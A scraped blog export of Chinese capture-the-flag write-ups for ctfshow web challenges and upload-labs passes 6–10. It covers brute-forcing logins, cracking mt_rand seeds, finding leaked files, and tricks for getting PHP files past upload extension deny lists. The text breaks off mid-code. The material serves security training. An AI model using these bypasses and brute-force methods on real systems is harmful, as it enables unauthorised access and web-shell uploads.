zh-CN,zh;q=0.9Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7Sec-Fetch-Site: noneSec-Fetch-Mode: navigateSec-Fetch-User: ?1Sec-Fetch-Dest: documentAccept-Encoding: gzip, deflate, brPriority: u=0, iConnection: keep-alive 我们注意到， MTExMTExMTExOjExMTExMTExMTExMTE= 是我们刚刚随便输入的密码，中间被:分隔，再被base64编码了一次，传输到intruder里 标为payload处，设置条件 1.前缀admin: 2.base64编码 记得取消url编码 开始爆破 HTTP/1.1 200 OKServer: nginx/1.20.1Date: Wed, 02 Jul 2025 12:27:20 GMTContent-Type: text/html; charset=utf-8Connection: keep-aliveX-Powered-By: PHP/7.3.11Access-Control-Allow-Methods: GET,POST,PUT,DELETE,OPTIONSAccess-Control-Allow-Credentials: trueAccess-Control-Expose-Headers: Content-Type,Cookies,Aaa,Date,Server,Content-Length,ConnectionAccess-Control-Allow-Headers: DNT,X-CustomHeader,Keep-Alive,User-Agent,X-Requested-With,If-Modified-Since,Cache-Control,Content-Type,Authorization,x-auth-token,Cookies,Aaa,Date,Server,Content-Length,ConnectionAccess-Control-Max-Age: 1728000Content-Length: 45ctfshow&#123;13e7a194-6d9a-4ed5-ae80-c51da9f628d8&#125; 得到flag ctfshow&#123;13e7a194-6d9a-4ed5-ae80-c51da9f628d8&#125; web22官方域名失效 web23&lt;?php/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date: 2020-09-03 11:43:51# @Last Modified by: h1xa# @Last Modified time: 2020-09-03 11:56:11# @email: h1xa@ctfer.com# @link: https://ctfer.com*/error_reporting(0);include(&#x27;flag.php&#x27;);if(isset($_GET[&#x27;token&#x27;]))&#123; $token = md5($_GET[&#x27;token&#x27;]); if(substr($token, 1,1)===substr($token, 14,1) &amp;&amp; substr($token, 14,1) ===substr($token, 17,1))&#123; if((intval(substr($token, 1,1))+intval(substr($token, 14,1))+substr($token, 17,1))/substr($token, 1,1)===intval(substr($token, 31,1)))&#123; echo $flag; &#125; &#125;&#125;else&#123; highlight_file(__FILE__);&#125;?&gt; 拿到题目，先对题目进行分析 传入token if(substr($token, 1,1)===substr($token, 14,1) &amp;&amp; substr($token, 14,1) ===substr($token, 17,1))&#123; 要求token的MD5 的第 2 位、第 15 位、第 18 位字符必须相同 if((intval(substr($token, 1,1))+intval(substr($token, 14,1))+substr($token, 17,1))/substr($token, 1,1)===intval(substr($token, 31,1)))&#123; 把第 2、第 15、第 18 位字符转为数字（intval()），求和后除以其中一个（第 2 位），要求等于第 32 位字符的数值。 使用python脚本爆破得到符合题意的token import hashlibdef check(md5_str): c1 = md5_str[1] c2 = md5_str[14] c3 = md5_str[17] c4 = md5_str[31] # 条件1: 三位相等 if c1 != c2 or c2 != c3: return False # 条件2: (int(c1)+int(c2)+int(c3)) / int(c1) == int(c4) try: n1 = int(c1) n2 = int(c2) n3 = int(c3) n4 = int(c4) except: return False if n1 == 0: return False result = (n1 + n2 + n3) / n1 return result == n4# 枚举输入for i in range(0, 1000000): s = str(i) md5_val = hashlib.md5(s.encode()).hexdigest() if check(md5_val): print(f&quot;[+] Found! Input: &#123;s&#125;&quot;) print(f&quot;MD5: &#123;md5_val&#125;&quot;) break 最终得到token的值为422 提交得到flag ctfshow&#123;fd42cfa8-7422-4cba-b7c0-d5b628b0c492&#125; web24mt_sand（）伪随机数 mt_rand() 是 PHP 中的一个函数，用于生成 伪随机整数，它的全称是 Mersenne Twister random。它比早期的 rand() 函数速度更快、随机性更好，因此通常建议使用 mt_rand() 替代 rand()。 这里给定了随机数种子372619038 若传递的r的值与随机出的一个值相同，就能得到flag 但mt_seed给定了种子，得到的随机数每一次都是相同的，我们可以提前运行一次mt_rand(372619038),把得到的值传递给r，就能得到flag &lt;?phpmt_srand(372619038);echo mt_rand().&#x27;&lt;br&gt;&#x27;;?&gt; 得到运行结果1155388967，将其传给r，得到flag 1155388967 web25&lt;?php/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date: 2020-09-03 13:56:57# @Last Modified by: h1xa# @Last Modified time: 2020-09-03 15:47:33# @email: h1xa@ctfer.com# @link: https://ctfer.com*/error_reporting(0);include(&quot;flag.php&quot;);if(isset($_GET[&#x27;r&#x27;]))&#123; $r = $_GET[&#x27;r&#x27;]; mt_srand(hexdec(substr(md5($flag), 0,8))); $rand = intval($r)-intval(mt_rand()); if((!$rand))&#123; if($_COOKIE[&#x27;token&#x27;]==(mt_rand()+mt_rand()))&#123; echo $flag; &#125; &#125;else&#123; echo $rand; &#125;&#125;else&#123; highlight_file(__FILE__); echo system(&#x27;cat /proc/version&#x27;);&#125; 我的理解: 首先需要了解的几个值 1.种子:这里被设定为flag的md5值中截取8位数，作为种子数 确定了种子后，mt_rand()的每一次值都是确定的 2.r，r是我们传递的数，对破解种子和后面if(!$rand)起作用 3.rand,rand是 r与第一次mt_rand之差 接下来我们确定做题步骤 1.得到第一次mt_rand 我们可以通过设置r&#x3D;0，得到-mt_rand 2.反向破解mt_rand，得到种子，有了种子，我们就能得到每一次mt_rand的值，最后得到flag 这里需要借助到反向破解mt_rand的工具：php_mt_seed 我们将mt_sand的值传入后，得到了很多值，这些种子运算一次得到的都是同一个值， 我们通过php的版本，得到可能是我们的种子，不多，多试几次就出来了 ，有了种子，事情就好解决了 3.if(!$rand)，rand的值必须为0，这样!0才会为真，让r&#x3D;第一次mt_rand(),这样rand为0，进入下一步 4.传入token，用burpsuite也行，hackbar也行，传入token，得到flag ctfshow&#123;069a6013-d7e1-42a7-a6e5-0ca9e710f2fa&#125; web26就是爆破一个密码值，爆出来就有flag了 ctfshow&#123;68667d15-bbbf-43e2-9184-b74dbfbfb408&#125; web27在录取名单中，我们能看到一些学生的姓名和部分身份证号， 我们选择迫害郎康焕同学（） 郎康焕522601********8092 很巧，522601********8092米被码住的地方是生日，我们选择使用bp，在查询系统中用日期爆破 最终得到身份证号：522601199210248092 接下来就用它拿到学号 恭喜您，您已被我校录取，你的学号为10248092 初始密码为身份证号码 至此 郎康焕52260119921024809210248092 登录后得到flag 恭喜您，登陆成功!ctfshow&#123;f706753e-aa01-4cd7-8af8-7f1825c4f70b&#125; web28拿到题目，看到url中有0&#x2F;1&#x2F;2.txt 在0和1两处添加payload位置，爆破后在72&#x2F;20&#x2F;处找到flag ctfshow&#123;205b50db-6eb2-4035-933c-3f3d1f3cb2e1&#125;","categories":[],"tags":[{"name":"ctf","slug":"ctf","permalink":"http://example.com/tags/ctf/"}]},{"title":"ctfshow wp——信息搜集(web01-web20)已完结","slug":"CTFwp/ctfshow信息泄露（web1-20)已完结","date":"2025-06-27T16:00:00.000Z","updated":"2025-07-07T13:50:45.045Z","comments":true,"path":"2025/06/28/CTFwp/ctfshow信息泄露（web1-20)已完结/","permalink":"http://example.com/2025/06/28/CTFwp/ctfshow%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%EF%BC%88web1-20)%E5%B7%B2%E5%AE%8C%E7%BB%93/","excerpt":"","text":"ctfshow wp——信息搜集(web01-web20) web1web1:where is flag?开发注释未及时删除 F12查看源代码 &lt;!--# -*- coding: utf-8 -*-# @Author: h1xa# @Date: 2020-09-01 13:45:32# @Last Modified by: h1xa# @Last Modified time: 2020-09-02 03:12:48# @email: h1xa@ctfer.com# @link: https://ctfer.com--&gt;&lt;!DOCTYPE HTML&gt;&lt;html&gt;&lt;head&gt;&lt;meta charset=&quot;utf-8&quot;&gt;&lt;title&gt;CTFshow 新手入门题目 &lt;/title&gt;&lt;script type=&quot;text/javascript&quot;&gt;&lt;/script&gt;&lt;/head&gt;&lt;body&gt; &lt;h3&gt;web1:where is flag?&lt;/h3&gt; &lt;!-- ctfshow&#123;9f6f5c41-03aa-4042-9104-41213bc6e21f&#125; --&gt;&lt;/body&gt;&lt;/html&gt; 得到flag: ctfshow&#123;9f6f5c41-03aa-4042-9104-41213bc6e21f&#125; web2js前台拦截 === 无效操作 无法查看源代码 ctrl+u查看网页源代码 &lt;!--# -*- coding: utf-8 -*-# @Author: h1xa# @Date: 2020-09-01 13:45:32# @Last Modified by: h1xa# @Last Modified time: 2020-09-02 03:20:04# @email: h1xa@ctfer.com# @link: https://ctfer.com--&gt;&lt;!DOCTYPE HTML&gt;&lt;html&gt;&lt;head&gt;&lt;meta charset=&quot;utf-8&quot;&gt;&lt;title&gt;CTFshow 新手入门题目 &lt;/title&gt;&lt;script type=&quot;text/javascript&quot;&gt; window.oncontextmenu = function()&#123;return false&#125;; window.onselectstart = function()&#123;return false&#125;; window.onkeydown = function()&#123;if (event.keyCode==123)&#123;event.keyCode=0;event.returnValue=false;&#125;&#125;;&lt;/script&gt;&lt;/head&gt;&lt;body&gt; &lt;h3&gt;无法查看源代码&lt;/h3&gt; &lt;!-- ctfshow&#123;1479640a-73e2-41c6-b759-bd17cb1daa38&#125; --&gt;&lt;/body&gt;&lt;/html&gt; 得到flag ctfshow&#123;1479640a-73e2-41c6-b759-bd17cb1daa38&#125; web3没思路的时候抓个包看看，可能会有意外收获 web3:where is flag? F12,查看网络项 access-control-allow-credentialstrueaccess-control-allow-headersDNT,X-CustomHeader,Keep-Alive,User-Agent,X-Requested-With,If-Modified-Since,Cache-Control,Content-Type,Authorization,x-auth-token,Cookies,Aaa,Date,Server,Content-Length,Connectionaccess-control-allow-methodsGET,POST,PUT,DELETE,OPTIONSaccess-control-expose-headersContent-Type,Cookies,Aaa,Date,Server,Content-Length,Connectionaccess-control-max-age1728000connectionkeep-alivecontent-encodinggzipcontent-typetext/html; charset=UTF-8dateMon, 30 Jun 2025 13:31:48 GMTflagctfshow&#123;91bf4b26-5e76-43b7-a694-9970908eae96&#125;servernginx/1.20.1transfer-encodingchunkedx-powered-byPHP/7.3.11 得到flag ctfshow&#123;91bf4b26-5e76-43b7-a694-9970908eae96&#125; web4总有人把后台地址写入robots，帮黑阔大佬们引路。 web4:where is flag? 根据题目提示，查看robots.txt User-agent: *Disallow: /flagishere.txt 查看url&#x2F;&#x2F;flagishere.txt 得到flag ctfshow&#123;78888822-0dce-47fc-b6c2-1f7b69302800&#125; web5phps源码泄露有时候能帮上忙 查看url&#x2F;index.phps &lt;?php/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date: 2020-09-01 14:14:17# @Last Modified by: h1xa# @Last Modified time: 2020-09-01 14:34:53# @email: h1xa@ctfer.com# @link: https://ctfer.com*///ctfshow&#123;1b4b42ee-d038-433d-8639-1a24fbb4a22b&#125;echo &quot;web5:where is flag ?&quot; 得到flag ctfshow&#123;1b4b42ee-d038-433d-8639-1a24fbb4a22b&#125; web6解压源码到当前目录，测试正常，收工 使用dirsearch工具扫描 C:\\Users\\reze&gt;cd dirsearchC:\\Users\\reze\\dirsearch&gt;python dirsearch.py -u https://f360c7dc-a7bb-45bd-b817-976fafd54ca1.challenge.ctf.show/ _|. _ _ _ _ _ _|_ v0.4.3 (_||| _) (/_(_|| (_| )Extensions: php, asp, aspx, jsp, html, htm | HTTP method: GET | Threads: 25 | Wordlist size: 12292Target: https://f360c7dc-a7bb-45bd-b817-976fafd54ca1.challenge.ctf.show/[21:39:29] Scanning:[21:40:11] 200 - 486B - /www.zipTask Completed 查看url&#x2F;&#x2F;www.zip 压缩包内有两项，提示我flag在fl000g.txt 查看url&#x2F;fl000g.txt 得到flag ctfshow&#123;2a987e6b-6f7b-4c8a-9ee3-5709f9579f00&#125; web7版本控制很重要，但不要部署到生产环境更重要。 web7:where is flag? _|. _ _ _ _ _ _|_ v0.4.3 (_||| _) (/_(_|| (_| )Extensions: php, asp, aspx, jsp, html, htm | HTTP method: GET | Threads: 25 | Wordlist size: 12292Target: https://c1117d39-2102-4589-bb57-a93d1868f6af.challenge.ctf.show/[21:45:28] Scanning:[21:45:32] 301 - 169B - /.git -&gt; http://c1117d39-2102-4589-bb57-a93d1868f6af.challenge.ctf.show/.git/[21:45:32] 200 - 46B - /.git/ 查看url&#x2F;.git 得到flag ctfshow&#123;147711f6-e831-4c04-bdfc-67a3f3d079fc&#125; web8版本控制很重要，但不要部署到生产环境更重要。 web8:where is flag? 扫描url _|. _ _ _ _ _ _|_ v0.4.3 (_||| _) (/_(_|| (_| )Extensions: php, asp, aspx, jsp, html, htm | HTTP method: GET | Threads: 25 | Wordlist size: 12292Target: https://ea06a964-c13c-46f6-8f34-692761ba5ff1.challenge.ctf.show/[21:47:32] Scanning:[21:47:38] 301 - 169B - /.svn -&gt; http://ea06a964-c13c-46f6-8f34-692761ba5ff1.challenge.ctf.show/.svn/[21:47:38] 200 - 46B - /.svn/ 查看url&#x2F;.svn 得到flag ctfshow&#123;970a109e-cace-4ac4-bbf5-a3fad8a2694c&#125; web9发现网页有个错别字？赶紧在生产环境vim改下，不好，死机了 web9:where is flag? 查看url&#x2F;index.php.swp 得到flag ctfshow&#123;8d17cc96-d8c3-4907-bb90-e7a3d87384f0&#125; web10cookie 只是一块饼干，不能存放任何隐私数据 F12查看网络选项，找到cookie cookieflag=ctfshow%7B6d5fcbf9-ade6-4f26-bece-63809cfccca3%7D 得到flag ctfshow&#123;6d5fcbf9-ade6-4f26-bece-63809cfccca3&#125; web11域名其实也可以隐藏信息，比如flag.ctfshow.com 就隐藏了一条信息 使用指令扫描 nslookup -q=txt flag.ctfshow.com 得到flag flag&#123;just_seesee&#125; web12有时候网站上的公开信息，就是管理员常用密码 _|. _ _ _ _ _ _|_ v0.4.3 (_||| _) (/_(_|| (_| )Extensions: php, asp, aspx, jsp, html, htm | HTTP method: GET | Threads: 25 | Wordlist size: 12292Target: https://e8f7fb3f-cc4e-4b23-9cf1-05e5f553b39d.challenge.ctf.show/[21:59:26] Scanning:[22:00:18] 301 - 169B - /admin -&gt; http://e8f7fb3f-cc4e-4b23-9cf1-05e5f553b39d.challenge.ctf.show/admin/[22:00:21] 401 - 42B - /admin/[22:00:23] 401 - 42B - /admin/index.php 查看url&#x2F;admin，显示需要用户名和密码，用户名尝试admin，嗯句题目提示，在最底部看到了一串数字:372619038，作为密码尝试，得到flag ctfshow&#123;bf0af490-344e-4dec-af4d-523d29132b41&#125; web13技术文档里面不要出现敏感信息，部署到生产环境后及时修改默认密码 在网页的底部，看到了documents一项，点击去后发现 ⚫ 登陆默认后台地址：http://your-domain/system1103/login.php默认用户名：admin默认密码：admin110 登录后得到flag ctfshow&#123;935e116b-f16f-4541-a30a-805c4c67b287&#125; web14有时候源码里面就能不经意间泄露重要(editor)的信息,默认配置害死人 根据题目提示，查看url&#x2F;eidtor 在提交文件中，可查看服务器文件，找到flag ctfshow&#123;0c6d851d-36df-4203-a237-7f8aa1419c8c&#125; web15公开的信息比如邮箱，可能造成信息泄露，产生严重后果 用dirsearch扫描url _|. _ _ _ _ _ _|_ v0.4.3 (_||| _) (/_(_|| (_| )Extensions: php, asp, aspx, jsp, html, htm | HTTP method: GET | Threads: 25 | Wordlist size: 12292Target: https://fd633af2-e216-4deb-9707-ef6482a1063a.challenge.ctf.show/[22:21:05] Scanning:[22:21:25] 200 - 8KB - /about.html[22:21:28] 301 - 169B - /admin -&gt; http://fd633af2-e216-4deb-9707-ef6482a1063a.challenge.ctf.show/admin/[22:21:29] 200 - 1KB - /admin/[22:21:30] 200 - 1KB - /admin/index.php 进入url&#x2F;admin 后台登录选项，点击忘记密码 我的所在地是哪个城市？ 在原页面中，透露了qq邮箱 用qq找到了本人，显示是西安人，输入西安后密码被重置为admin7789 用其登录后拿到flag ctfshow&#123;6a8cea05-5a2d-43f8-bde0-c8f3bdc8be5e&#125; web16对于测试用的探针，使用完毕后要及时删除，可能会造成信息泄露 查看探针url&#x2F;tz.php 点进后查看phpinfo 找到flag FLAG ctfshow&#123;35c5c564-a0b8-445e-b928-311cedd8863c&#125; web17备份的sql文件会泄露敏感信息 用dirsearch扫描 _|. _ _ _ _ _ _|_ v0.4.3 (_||| _) (/_(_|| (_| )Extensions: php, asp, aspx, jsp, html, htm | HTTP method: GET | Threads: 25 | Wordlist size: 12292Target: https://e15c4b4f-7842-4f09-a974-5262d44209fa.challenge.ctf.show/[22:30:15] Scanning:[22:30:30] 200 - 934B - /backup.sql[22:30:37] 301 - 185B - /images -&gt; http://e15c4b4f-7842-4f09-a974-5262d44209fa.challenge.ctf.show/images/[22:30:37] 403 - 571B - /images/ 查看url&#x2F;backup.sql 得到flag ctfshow&#123;b6dab5f3-a3b3-457e-a558-3512f442a316&#125; web18不要着急，休息，休息一会儿，玩101分给你flag F12查看源代码，得到了 if(score&gt;100)&#123;var result=window.confirm(&quot;\\u4f60\\u8d62\\u4e86\\uff0c\\u53bb\\u5e7a\\u5e7a\\u96f6\\u70b9\\u76ae\\u7231\\u5403\\u76ae\\u770b\\u770b&quot;);&#125; 解码后发现是 16进制转字符: 你赢了，去幺幺零点皮爱吃皮看看 查看url&#x2F;110.php，得到flag ctfshow&#123;e5fa4ecb-d807-4f12-ba14-727328dbe3fa&#125; web19密钥什么的，就不要放在前端了 F12查看源代码，发现 &lt;/script&gt; &lt;!-- error_reporting(0); $flag=&quot;fakeflag&quot; $u = $_POST[&#x27;username&#x27;]; $p = $_POST[&#x27;pazzword&#x27;]; if(isset($u) &amp;&amp; isset($p))&#123; if($u===&#x27;admin&#x27; &amp;&amp; $p ===&#x27;a599ac85a73384ee3219fa684296eaa62667238d608efa81837030bd1ce1bf04&#x27;)&#123; echo $flag; &#125;&#125; --&gt; 使用burpsuit抓包 POST / HTTP/1.1Host: 44b39150-c659-466f-95a3-6a21e89743f8.challenge.ctf.showUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:139.0) Gecko/20100101 Firefox/139.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflate, brContent-Type: application/x-www-form-urlencodedContent-Length: 88Origin: https://44b39150-c659-466f-95a3-6a21e89743f8.challenge.ctf.showReferer: https://44b39150-c659-466f-95a3-6a21e89743f8.challenge.ctf.show/Upgrade-Insecure-Requests: 1Sec-Fetch-Dest: documentSec-Fetch-Mode: navigateSec-Fetch-Site: same-originSec-Fetch-User: ?1Priority: u=0, iTe: trailersConnection: keep-aliveusername=admin&amp;pazzword=a599ac85a73384ee3219fa684296eaa62667238d608efa81837030bd1ce1bf04 得到flag ctfshow&#123;38547630-0ea1-4d66-9923-44b98a926d0b&#125; web20mdb文件是早期asp+access构架的数据库文件，文件泄露相当于数据库被脱裤了。 扫描发现url&#x2F;db&#x2F;db.mdb 下载后查看，找到flag flag&#123;ctfshow_old_database&#125; 至此，完结","categories":[],"tags":[{"name":"ctf","slug":"ctf","permalink":"http://example.com/tags/ctf/"}]},{"title":"uploads-lab6-10","slug":"CTFwp/uploads-labs6-10","date":"2025-05-23T16:00:00.000Z","updated":"2025-05-24T13:05:40.053Z","comments":true,"path":"2025/05/24/CTFwp/uploads-labs6-10/","permalink":"http://example.com/2025/05/24/CTFwp/uploads-labs6-10/","excerpt":"","text":"uploads-lab6-10 pass6： $is_upload = false;$msg = null;if (isset($_POST[&#x27;submit&#x27;])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;,&quot;.ini&quot;); $file_name = trim($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]); $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, &#x27;.&#x27;); $file_ext = str_ireplace(&#x27;::$DATA&#x27;, &#x27;&#x27;, $file_ext);//去除字符串::$DATA $file_ext = trim($file_ext); //首尾去空 if (!in_array($file_ext, $deny_ext)) &#123; $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;]; $img_path = UPLOAD_PATH.&#x27;/&#x27;.date(&quot;YmdHis&quot;).rand(1000,9999).$file_ext; if (move_uploaded_file($temp_file, $img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = &#x27;上传出错！&#x27;; &#125; &#125; else &#123; $msg = &#x27;此文件类型不允许上传！&#x27;; &#125; &#125; else &#123; $msg = UPLOAD_PATH . &#x27;文件夹不存在,请手工创建！&#x27;; &#125;&#125; 查看源代码，发现并没有删除大写小，我们先上传php文件，再在bp中修改后缀大小写，上传成功 pass-7: $is_upload = false;$msg = null;if (isset($_POST[&#x27;submit&#x27;])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;,&quot;.ini&quot;); $file_name = $_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]; $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, &#x27;.&#x27;); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = str_ireplace(&#x27;::$DATA&#x27;, &#x27;&#x27;, $file_ext);//去除字符串::$DATA if (!in_array($file_ext, $deny_ext)) &#123; $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;]; $img_path = UPLOAD_PATH.&#x27;/&#x27;.date(&quot;YmdHis&quot;).rand(1000,9999).$file_ext; if (move_uploaded_file($temp_file,$img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = &#x27;上传出错！&#x27;; &#125; &#125; else &#123; $msg = &#x27;此文件不允许上传&#x27;; &#125; &#125; else &#123; $msg = UPLOAD_PATH . &#x27;文件夹不存在,请手工创建！&#x27;; &#125;&#125; 查看源码，我们发现并没有删除空格，我们先上传php文件，在后缀后加上几个空格即可 上传成功 pass8： $is_upload = false;$msg = null;if (isset($_POST[&#x27;submit&#x27;])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;,&quot;.ini&quot;); $file_name = trim($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]); $file_ext = strrchr($file_name, &#x27;.&#x27;); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = str_ireplace(&#x27;::$DATA&#x27;, &#x27;&#x27;, $file_ext);//去除字符串::$DATA $file_ext = trim($file_ext); //首尾去空 if (!in_array($file_ext, $deny_ext)) &#123; $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;]; $img_path = UPLOAD_PATH.&#x27;/&#x27;.$file_name; if (move_uploaded_file($temp_file, $img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = &#x27;上传出错！&#x27;; &#125; &#125; else &#123; $msg = &#x27;此文件类型不允许上传！&#x27;; &#125; &#125; else &#123; $msg = UPLOAD_PATH . &#x27;文件夹不存在,请手工创建！&#x27;; &#125;&#125; 查看文件，我们发现并没有删去后缀中的”.”，我们先上传php文件 再在后缀中加上一个”.” 上传成功 pass9: $is_upload = false;$msg = null;if (isset($_POST[&#x27;submit&#x27;])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;,&quot;.ini&quot;); $file_name = trim($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]); $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, &#x27;.&#x27;); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = trim($file_ext); //首尾去空 if (!in_array($file_ext, $deny_ext)) &#123; $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;]; $img_path = UPLOAD_PATH.&#x27;/&#x27;.date(&quot;YmdHis&quot;).rand(1000,9999).$file_ext; if (move_uploaded_file($temp_file, $img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = &#x27;上传出错！&#x27;; &#125; &#125; else &#123; $msg = &#x27;此文件类型不允许上传！&#x27;; &#125; &#125; else &#123; $msg = UPLOAD_PATH . &#x27;文件夹不存在,请手工创建！&#x27;; &#125;&#125; 我们发现，并没有删去后缀加”::$DATA”，我们先上传.php文件,再在后缀后加上”::$DATA” 上传成功！ pass10： $is_upload = false;$msg = null;if (isset($_POST[&#x27;submit&#x27;])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = 